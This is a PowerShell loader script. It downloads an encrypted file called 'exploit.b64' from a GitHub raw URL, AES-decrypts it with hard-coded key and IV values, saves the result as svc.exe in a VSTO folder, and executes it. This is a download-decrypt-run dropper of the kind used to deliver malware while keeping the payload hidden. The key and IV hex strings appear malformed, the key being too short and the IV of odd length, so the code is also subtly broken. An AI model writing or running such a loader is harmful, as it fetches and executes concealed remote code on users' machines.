function Dec-AES {
    param($b64, $keyHex, $ivHex)
    $data = [Convert]::FromBase64String($b64.Trim())
    function H2B($h) {
        $b = New-Object Byte[] ($h.Length/2)
        for($i=0;$i -lt $h.Length;$i+=2){$b[$i/2]=[Convert]::ToByte($h.Substring($i,2),16)}
        return $b
    }
    $aes = New-Object System.Security.Cryptography.RijndaelManaged
    $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.BlockSize = 128
    $aes.KeySize   = 256
    $aes.Key = H2B $keyHex
    $aes.IV  = H2B $ivHex
    $dec = $aes.CreateDecryptor()
    return $dec.TransformFinalBlock($data, 0, $data.Length)
}

$K = "4f70657261746f724b657932303234313200000000000000000000000000"
$V = "496e6974566563746f723132313200000"
$b64 = (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/lowsig/REPO/main/exploit.b64")
$bytes = Dec-AES $b64 $K $V
[IO.File]::WriteAllBytes("C:\installs\VSTO\svc.exe", $bytes)
& "C:\installs\VSTO\svc.exe"